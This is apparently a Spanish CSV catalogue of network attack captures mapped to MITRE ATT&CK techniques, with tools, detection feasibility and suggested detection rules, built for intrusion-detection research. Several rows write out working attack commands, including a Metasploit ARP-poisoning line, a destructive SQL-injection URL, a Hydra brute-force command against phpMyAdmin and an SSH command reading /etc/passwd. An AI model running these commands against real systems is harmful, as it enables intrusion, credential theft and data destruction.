Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,-,-,Suplantación del puente raíz,yersinia,T1557-Puente_raiz_[1].pcapng,STP,6,1,0,1,1,1,0,-,NO**,"Si el ataque viene seguido de suplantaciones ARP, con el uso de preprocesadores de Snort resulta posible su detección. En caso de que el ataque se centre únicamente en el establecimiento del atacante como puente raíz, no existe mecanismo de detección",Establecimiento de atacante como puente raíz,Manual [1] / 2.1.4.1.2,Manual [1] / E.6,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,La suplantacion de un puente raiz siempre se considera como un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,-,-,Redirección,"ettercap, netwox",T1557-Redireccion_[1].pcapng,ARP,2,1,0,1,1,1,0,-,NO**,Regla personalizada que detecte envío de paquetes ICMP Redirect por parte de un equipo que no debería intervenir en labores de redirección,-,Manual [1] / 2.2.2.1.3,Manual [1] / E.8,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,La dredireccion siempre se considera como un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Envenenamiento ARP,Arpspoof,T1557.002-ARP_poisoning1_[2].pcapng,ARP,13,1,0,1,1,1,0,-,NO,-,Envenenamiento de tablas ARP mediante Arpspoof.,Manual [2] / 3.4.1.1,Manual [5] / C.32,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,El envenamiento ARP siempre es un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Envenenamiento ARP,Metasploit,T1557.002-ARP_poisoning2_[3].pcapng,ARP,0,1,0,2,2,2,0,-,NO,-,"Se realiza un ataque MITM, mediante el envenanamiento de las tablas de ARP caché de un equipo y su gateway. De esta toda se redirige todo el tráfico para que pase a través del equipo del atacante. Comando: msfconsole -x ""use auxiliary/spoof/arp/arp_poisoning; set BIDIRECTIONAL true; set interface eth1; set DHOSTS 192.168.1.2; set SHOSTS 192.168.1.1; run -j -z; sleep 5; kill 0; exit""",Manual [3] / 3.8.19,Manual [3] / 3.8.19 y Manual [5] / C.33,Manual [3] / 3.8.19.5 y Manual [5] / 5.7.3,1,1,0,1,1,1,LV1,El envenamiento ARP siempre es un ataque,L2 (Switch),0,0
Lateral Movement,-,TA0008,Remote Service Session Hijacking,T1563,RDP Hijacking,T1563.002,Secuestro de sesión RDP mediante tscon.exe,tscon.exe,T1563.002-RDPHijacking_[5].pcapng,RDP,113,2,0,2,2,2,0,-,SI,"Regla genérica que detecte el intento de establecimiento de sesiones RDP poco convenciales, haciendo uso de los protocolos mínimos de seguridad.","Uso de Windows Server 2012 R2 con DNS, Active Directory y Servicio de Escritorio Remoto",Manual [5] / 4.7.1,Manual [5] / C.12,Manual [5] / 5.9.3,1,1,0,1,0,1,LV1,El secuestro de una sesion RDP siempre se considera como un ataque,L3,0,1
Impact,-,TA0040,Data Manipulation,T1565,Stored Data Manipulation,T1565.001,Inyección SQL,Sqlmap,T1565.001-SQL_inyection_[3].pcapng,HTTP,11,1,0,1,1,1,0,-,SI,Regla genérica que detecte una inyección SQL en la URL de acceso a una página web,"""El objetivo es generar daño en la BBDD. Queremos borrar lineas de una tabla. Comando: http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20DELETE%20FROM%20contactos%20WHERE%20num=3--""",Manual [3] / 3.8.8,Manual [3] / 3.8.8.4 y Manual [5] / C.34,Manual [3] / 3.8.8.5 y Manual [5] / 5.13.1,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Initial Access,-,TA0001,Phishing,T1566,Spearphishing Attachment,T1566.001,Envío de emails con documentos maliciosos,-,T1566.001-C2018_[6].pcapng,-,9,1,0,1,1,1,0,-,SI*,Si los mensajes contienen determinados patrones como intentos de creación de Shells remotos sí que pueden ser detectados por los cortafuegos en base a reglas que detecten cadenas específicas en los paquetes,-,Dataset CIC-2018,Dataset CIC-2018,Manual [5] / 5.3.5,1,1,0,1,0,0,LV2,"En general, el envio de documentos por email puede verse como tráfico legitimo pero dependiendo de las circunstancias puede ser un ataque",L3,0,1
Initial Access,-,TA0001,Phishing,T1566,Spearphishing Link,T1566.002,Obtener un acceso inicial mediante ingeniería social utilizando un enlace adjunto en un correo que descargue un fichero que establezca una sesión al equipo víctima,"SEToolKit, Metasploit",T1566.002-Spearphishing_Link_[5].pcapng,-,170,1,0,1,1,1,0,-,NO,Detección por listas negras/anomalías que permitan detectar tráfico de red correspondiente a correos electrónicos con enlaces maliciosos que contengan contenido malware,"Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot",Manual [5] / 4.2.2,Manual [5] / C.13,Manual [5] / 5.3.5,1,1,0,1,0,1,LV1,"El Phishing, en general, puede confundirse con actividad legítima (eso es lo que hace que el ataque tenga éxito). En ese sentido, aunque siempre será un ataque, dependiendo del contexto podrá no distinguirse de una actividad legítima",L3,1,0
Exfiltration,-,TA0010,Exfiltration over Web Service,T1567,Exfiltration to Cloud Storage,T1567.002,Exfiltrar datos de un equipo a la nube,Google Drive,T1567.002-Exfiltration_To_Cloud_Storage_[5].pcapng,TCP,26,1,0,1,1,1,0,-,NO,Deteccion por listas negras/anomalías,Transferir ficheros de un equipo a la nube,Manual [5] / 4.9.3,Manual [5] / C.14,Manual [5] / 5.12.8,1,1,0,1,0,1,LV2,"La exfiltracion de datos a la nube puede considerarse como una actividad legítima en determinados casos. Sin embargo, tambien puede ser una manera de ataque",L3,1,1
Command and Control,-,TA0040,Dynamic Resolution,T1568,Fast Flux DNS,T1568.001,Esconder un C2 Server mediante un servidor DNS con bajo TTL y modo Fast Flux,"bind, Metasploit",T1568-fastFluxDNS_[5].pcapng,DNS,266,123,0,123,123,123,0,-,SI,"Regla genérica que detecte una respuesta DNS que devuelva varias direcciones IP. Es decir, detecta el comportamiento de un DNS Round Robin","Servidor DNS ""Round Robin""",Manual [5] / 4.8.4,Manual [5] / C.15,Manual [5] / 5.11.10,1,1,0,1,0,1,LV2,"El ataque del pcap permuta entre 2 IPs de servidores DNS. En algunos entornos, esto puede ser un funcionamiento legítimo",L3,0,1
Execution,-,TA0002,System Services,T1569,Service Execution,T1569.002,Ejecución de un Servicio / Fichero Ejecutable de manera remota,PsExec,T1569-System_services_service_execution_[4].pcapng,SVCCTL,17,11,0,11,11,11,0,-,SI,"Existen múltiples métodos de detección. Como ejemplos:
 Regla que detecte la cadena “PSEXESVC” en el contenido de mensajes SMBv2
 Regla que detecte archivos ejecutables en mensajes SMB
",-,Manual [4] / 3.6,Manual [4] / B.6,Manual [4] / 4.6,1,1,0,1,0,1,LV2,La creación de un servicio o proceso de forma remota es legítima cuando el usuario permite o autoriza dicho movimiento,L3,0,1
Lateral Movement,-,TA0008,Lateral Tool Transfer,T1570,-,-,Transferencia de herramientas para la continuación del ataque entre máquinas utilizando protocolos de compartición de archivos,Metasploit,T1570-Lateral_Tool_Transfer_[5].pcapng,FTP,7,1,1,1,2,1,1,Ejecución de comandos de forma remota (no constituyen el ataque en sí) - T1059,SI,"Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.",Transferencia mediante FTP de ficheros entre dos equipos,Manual [5] / 4.7.2,Manual [5] / C.16,Manual [5] / 5.9.4,1,1,0,1,0,1,LV2,La transferencia de herramientas entre equipos no necesariamente implica un ataque.,L3,1,1
Command and Control,-,TA0040,Non-Standard Port,T1571,-,-,Sesión SSH en puerto 2200,ssh,T1571-SSH_[2].pcapng,SSH,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte el uso de SSH sobre un puerto no estándar,Establecer una sesion SSH sobre un puerto no estandar. Comando: sshpass -p salas ssh salas@192.168.2.2 -p 2200 cat /etc/passwd,Manual [2] / 3.1.9.1,Manual [5] / C.35,-,1,1,0,1,0,1,LV2,El uso de SSH en otros puertos es una acción legítima muy común en ciertos entornos,L3,0,1
Command and Control,-,TA0040,Protocol Tunneling,T1572,-,-,Tunelizar la conexión al C2 Server mediante SSH,"SSH, Metasploit",T1572-Protocol_Tunneling_[5].pcapng,SSH,3,1,1,1,1,1,0,-,SI,Regla genérica que detecte el uso de un protocolo para tunelizar comunicaciones C&C,Tunelizar una conexion mediante SSH,Manual [5] / 4.8.6,Manual [5] / C.17,Manual [5] / 5.11.12,1,1,0,1,0,1,LV2,La tunelización de un canal no necesariamente es un ataque. Un administrador de red puede utilizar SSH por ejemplo para acceder a otro equipo y es lo mismo que un atacante realizaría,L3,1,1
Command and Control,-,TA0040,Encrypted Channel,T1573,Asymetric Cryptography,T1573.002,Encriptar conexion con C2 Server,"Metasploit, OpenSSL",T1573.002-AsymetricCryptography_[5].pcapng,SSL,2,1,0,1,1,1,0,-,NO**,"Deteccion por anomalías, monitorizando la creacion de nuevas conexiones",Encriptar conexion al C2 Server,Manual [5] / 4.8.7,Manual [5] / C.18,Manual [5] / 5.11.13,1,1,0,1,0,1,LV2,Encriptar un canal no necesariamente es un ataque. Un administrador de red puede utilizar SSH por ejemplo para acceder a otro equipo y es lo mismo que un atacante realizaría,L3,0,1
Resource Development,-,TA0042,Compromise Infrastructure,T1584,DNS Server,T1584.002,Envenenamiento de Caché DNS,ettercap,T1584-Cache_dns_[1].pcapng,DNS,8,1,0,1,1,1,0,-,NO,"Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no",-,Manual [1] / 2.4.1.1.5,Manual [1] / E.16,Manual [5] / 5.2.3.1,1,0,0,1,0,1,LV1,El envenenamiento de la cache DNS siempre es un ataque,L3,0,0
Resource Development,-,TA0042,Compromise Infrastructure,T1584,DNS Server,T1584.002,Secuestro / Redireccionamiento DNS,ettercap,T1584-Secuestro_dns_[1].pcapng,DNS,5,1,0,1,1,1,0,-,NO,"Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no",-,Manual [1] / 2.4.1.1.4,Manual [1] / E.15,Manual [5] / 5.2.3.1,1,0,0,1,0,1,LV1,El secuestro DNS siempre es un ataque,L3,0,0
Resource Development,-,TA0042,Compromise Infrastructure,T1584,Botnet,T1584.005,Uso de Botnet,"Ares, Screenshot and key logging",T1584.005-C2018_[6].pcapng,-,81521,81521,0,1,1,1,0,-,NO,"La detección debe centrarse en otras fases del ciclo de vida de un ataque, como Phishing, DDoS...",Uso de Ares y screenshots y key logging https://www.unb.ca/cic/datasets/ids-2018.html,Dataset CIC-2018,Dataset CIC-2018,Manual [5] / 5.2.3.1,1,1,0,1,0,1,LV1,El uso de Botnet siempre es un atauqe,L3,1,0
Resource Development,-,TA0042,Establish Accounts,T1585,Social Media Accounts,T1585.001,Creación de cuentas de redes sociales,"Sitios web convencionales (Facebook, Github, Microsoft ...)",T1585.001-Establish_social_accounts_[4].pcapng,TCP,129,1,0,1,1,1,0,-,NO,"Siempre y cuando el origen sea la red a proteger, detección por anomalías que identifique un incipiente aumento de las peticiones a servidores de redes sociales.",-,Manual [4] / 3.2,Manual [4] / B.2,Manual [4] / 4.2,1,1,0,1,0,1,LV2,La creación de cuentas de redes sociales es una acción totalmente legítima en ciertos contextos,L3,1,0
Resource Development,-,TA0042,Compromise Accounts,T1586,Social Media Accounts,T1586.001,Fuerza bruta para acceso a web,Hydra,T1586.001-Compromise_Accounts_[2].pcapng,HTTP,6951,6951,0,701939,701939,701939,0,-,SI,Regla genérica que detecte un ataque de fuerza bruta en base al envío masivo de peticiones de acceso a una página web,"Ataque de fuerza bruta a formulario de acceso a página web phpMyAdmin. Comando: hydra -l root -P /usr/share/john/password.lst 192.168.2.2 http-post-form ""/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:#1045 Cannot log in to the MySQL server""",Manual [2] / 3.1.2.1,Manual [5] / C.36,Manual [2] / 4.2.1.3,1,1,0,1,0,1,LV1,El uso de la fuerza bruta para acceder a una página web siempre es un ataque,L3,1,1
Reconnaissance,-,TA0043,Gather Victim Identity Information,T1589,Email Addresses,T1589.002,Recogida de cuentas de correo eléctronico y validación de las mismas,"theHarvester, bulk-email-verifier",T1589.002-Gather_victim_identity_information_[4].pcapng,SMTP,7,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un número elevado de intentos de conexión y mensajes ehlo SMTP procedentes de un mismo origen hacia un servidor, con diferentes destinatarios.",-,Manual [4] / 3.1,Manual [4] / B.1,Manual [4] / 4.1,1,1,0,1,0,1,LV2,La recogida de cuentas de correo electrónico así como la comprobación de su validez puede considerarse como acción legítima en algunos contextos,L3,0,1
Reconnaissance,-,TA0043,Active Scanning,T1595,Vulnerability Scanning,T1595.002,Escaneo de vulnerabilidades,nmap,T1595.002-Port_Scanning_[3].pcapng,TCP,2058,2049,0,2060,2060,2060,0,-,SI,"Regla genérica que detecte el envío de paquetes TCP con flag SYN activado a varios puertos diferentes, sin respuesta del atacante a los ACK posteriores.",Ejecución de comando nmap para escaneo de puertos y detección de vulnerabilidades (nmap -sV --script vulscan IP),Manual [3] / 3.8.2,Manual [3] / 3.8.2.4 y Manual [5] / C.37,Manual [3] / 3.8.2.5,1,1,0,1,0,1,LV1,Un escaneo exhaustivo de puertos constituye un ataque,L3,1,1
Reconnaissance,-,TA0043,Active Scanning,T1595,Wordlist Scanning,T1595.003,Escaneo de página web,Dirb,T1595.003-Web_page_scanning1_[2].pcapng,HTTP,6951,6950,0,6950,6950,6950,0,-,SI,Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor,Ejecucion de comando dirb para escaneo de la estructura de directorios (dirb http://IP -w /usr/share/dirb/wordlist/vulns/apache.txt),Manual [2] / 3.1.1.1,Manual [5] / C.38,Manual [2] / 4.1.1.1,1,1,0,1,0,1,LV1,Un escaneo exhaustivo de una página web siempre es un ataque,L3,1,1
Reconnaissance,-,TA0043,Active Scanning,T1595,Wordlist Scanning,T1595.003,Escaneo de página web,GoBuster,T1595.003-Web_page_scanning2_[3].pcapng,HTTP,385,385,0,4615,4615,4615,0,-,SI,Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor,Ejecucion de comando GoBuster para escaneo de la estructura de directorios,Manual [3] / 3.8.4,Manual [3] / 3.8.4.4 y Manual [5] / C.39,Manual [3] / 3.8.4.5,1,1,0,1,0,1,LV1,Un escaneo exhaustivo de una página web siempre es un ataque,L3,0,1
Reconnaissance,-,TA0043,Search Open Technical Databases,T1596,DNS/Passive DNS,T1596.001,Transferencia de zona DNS,Dirb,T1596.001-DNS_Transfer_[2].pcapng,DNS,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte paquetes TCP dirigidos al puerto 53 que tengan los bytes ""Question"" igual a 1 y el resto a cero. Además, el campo ""Type"" debe tomar el valor ""00 FC""",Ejecución de comando para obtener informacion de la víctima (host -l javier.example.com IP),Manual [2] / 3.1.1.2,Manual [5] / C.40,Manual [2] / 4.2.1.2,1,1,0,1,0,1,LV1,El uso de DNS para realizar una transferencia de zona siempre es un ataque,L3,0,1
Reconnaissance,-,TA0043,Phishing for Information,T1598,Spearphishing Link,T1598.003,Recogida de información de la víctima mediante ingeniería social,SEToolKit,T1598.003-Spearphishing_Link_[5].pcapng,-,59,2,0,4,4,4,0,-,SI,Detección de macros o plantillas comúnmente usadas para llevar a cabo ataques de Phishing,"Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot",Manual [5] / 4.1.1,Manual [5] / C.19,Manual [5] / 5.1.3,1,1,0,1,0,1,LV1,"El phishing, en general, puede confundirse con actividad legítima (eso es lo que hace que el ataque tenga éxito). En ese sentido, aunque siempre será un ataque, dependiendo del contexto podrá no distinguirse de una actividad legítima",L3,1,1
Defense Evasion,-,TA0005,Network Boundary Bridging,T1599,NAT Traversal,T1599.001,Modificación de políticas de red para permitir tráfico externo a la red interna,iptables,T1599-NBB1_[5].pcapng,SSH,5,1,0,1,1,1,0,-,NO,Deteccion por anomalías,Equipo intermedio entre red interna de la víctima y el atacante con firewall. El atacante con acceso a este equipo intermedio modifica las reglas del firewall iptables para permitir su tráfico.,Manual [5] / 4.4.2,Manual [5] / C.20,Manual [5] / 5.6.6,1,1,0,1,0,1,LV2,La modificacion de politicas de red puede ser realizada por un atacante o por un administrador de red,L3,0,0
Defense Evasion,-,TA0005,Network Boundary Bridging,T1599,Network Address Translation Transversal,T1599.001,Modificación de políticas de red para permitir tráfico externo a la red interna,iptables,T1599-NBB2_[5].pcapng,SSH,3,1,0,1,1,1,0,-,NO,Deteccion por anomalías,Equipo intermedio entre red interna de la víctima y el atacante con firewall. El atacante con acceso a este equipo intermedio modifica las reglas del firewall iptables para permitir su tráfico.,Manual [5] / 4.4.2,Manual [5] / C.20,Manual [5] / 5.6.6,1,1,0,1,0,1,LV2,La modificacion de politicas de red puede ser realizada por un atacante o por un administrador de red,L3,0,0
Defense Evasion,-,TA0005,Network Boundary Bridging,T1599,-,-,Salto de VLAN,ip,T1599-Salto_vlan_[1].pcapng,SNMP,1364,1,0,1,1,1,0,-,NO,"Detección por anomalías y estudio de topología de red, que detecte posibles vulnerabilidades relacionadas con el etiquetado apilable 802.1Q",-,Manual [1] / 3.2.1,Manual [1] / E.4,Manual [5] / 5.6.6,1,1,0,1,1,1,LV1,El salto vlan siempre es un ataque,L2 (Switch),0,0
Collection,-,TA0009,Data from Configuration Repository,T1602,SNMP (MIB Dump),T1602.001,Recogida MIB de un equipamiento,Metasploit,T1602.001-MIB_Dump_[2].pcapng,SNMP,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte el uso del protocolo SNMP sobre UDP para acceder a la comunidad public, con fin de realizar un volcado total de las tablas","Este ataque obtiene informacion de la MIB de un equipo mediante peticiones SNMP. Comando: msfconsole -x ""use auxiliary/scanner/snmp/snmp_enum; set RHOSTS 192.168.2.2; run; exit""",Manual [2] / 3.1.8.1,Manual [5] / C.41,Manual [2] / 4.2.1.10,1,1,0,1,0,1,LV2,"La recogida de MIBs haciendo uso de SNMP no siempre es un ataque, puede tratarse de una acción legítima",L3,0,1
Defense Evasion,-,TA0005,Build Image on Host,T1612,-,-,Creacion y montado de un contenedor con un servidor SSH sobre un equipo previamente vulnerado,"DockerAPI, SSH",T1612-BuildImageOnHostLocal_[5].pcapng,SSH,69,1,0,1,1,1,0,-,SI,Regla genérica que detecte descargas de contenedores mediante Docker API,Construir contenedor sobre el equipo víctima para evitar ser detectados.,Manual [5] / 4.4.3,Manual [5] / C.21,Manual [5] / 5.6.7,1,1,0,1,0,1,LV2,Construir un contenedor en un equipo puede ser realizado por un administrador de red para alguna labor o por un atacante,L3,0,1
Defense Evasion,-,TA0005,Build Image on Host,T1612,-,-,Creacion y montado de un contenedor con un servidor SSH sobre un equipo previamente vulnerado,"DockerAPI, SSH",T1612-BuildImageOnHostNAT_[5].pcapng,SSH,119,4,0,1,1,1,0,-,SI,Regla genérica que detecte descargas de contenedores mediante Docker API,Construir contenedor sobre el equipo víctima para evitar ser detectados.,Manual [5] / 4.4.3,Manual [5] / C.21,Manual [5] / 5.6.7,1,1,0,1,0,1,LV2,Construir un contenedor en un equipo puede ser realizado por un administrador de red para alguna labor o por un atacante,L3,1,1
Discovery,-,TA0007,Group Policy Discovery,T1615,-,-,Comandos mediante Powershell para obtener información sobre configuraciones de políticas de grupo,PowerShell,T1615-Group_Policy_Discovery_[5].pcapng,TCP,58,41,0,41,41,41,0,-,NO,Detección por anomalías,Ejecución de comandos mediante Powershell para comprobar políticas de grupo,Manual [5] / 4.6.1,Manual [5] / C.22,Manual [5] / 5.8.3,1,1,0,1,0,1,LV2,El descubrimiento de politicas de grupo puede ser realizado por un administrador de red o por un atacante,L3,0,0
Initial Access,Command and Control,TA0001,Content Injection,T1659,-,-,Inyección,Suite aircrack-ng,T1659_Inyeccion_[1].pcapng,ARP,12,1,0,1,1,1,0,-,NO,"Detección por anomalías, paquetes sospechosos de haber sido generados aleatoriamente y sin correlación con las comunicaciones establecidas.",-,Manual [1] / 2.5.1.1.4,Manual [1] / E.23,Manual [5] / 5.3.6,1,1,0,1,0,1,LV1,Esta técnica siempre se considera como un ataque,L2 (Switch),0,0
Initial Access,Command and Control,TA0001,Content Injection,T1659,-,-,"Realizar una suplantación de identidad DHCP, saturando el servidor DHCP verdadero para que el servidor DHCP del atacante procese las consultas de un usuario. Posteriormente se manipula alguna consulta inyectando contenido malicioso","dhcpstarv, Metasploit",T1659-Content_Injection_[5].pcapng,TCP,90,2,0,2,2,2,0,-,SI,La detección de esta técnica será más o menos viable dependiendo del objetivo y método del atacante. Si el ataque se realiza en conjunto con protocolos de gestion(DHCP) dificultará la detección. Resultará necesario monitorizar por la distribución a traves del tráfico de red de archivos malware,Suplantacion de identidad de DHCP Server para posteriormente inyectar contenido en la víctima con malware,Manual [5] / 4.2.3,Manual [5] / C.23,Manual [5] / 5.3.6,1,1,0,1,0,1,LV1,La inyeccion de contenido en otro equipo siempre se considera como un ataque,L3,1,1
Command and Control,-,TA0040,Hide Infrastructure,T1665,-,-,Esconder el servidor C2 utilizando un Proxy,"Metasploit, HTTP Server",T1665-Hide_Infrastructure_[5].pcapng,HTTP,12,1,1,1,2,1,1,Ejecución de comandos de forma remota (no constituyen el ataque en sí) - T1059,NO**,"Detección por reglas/anomalías. Resulta importante monitorizar tráfico de red con destino a dominios incluidos en listas negras, conexiones a equpos externos...",Esconder el servidor C2 utilizando un proxy,Manual [5] / 4.8.5,Manual [5] / C.24,Manual [5] / 5.11.11,1,1,0,1,0,1,LV1,Esconder un servidor C2 siempre es un ataque,L3,1,0
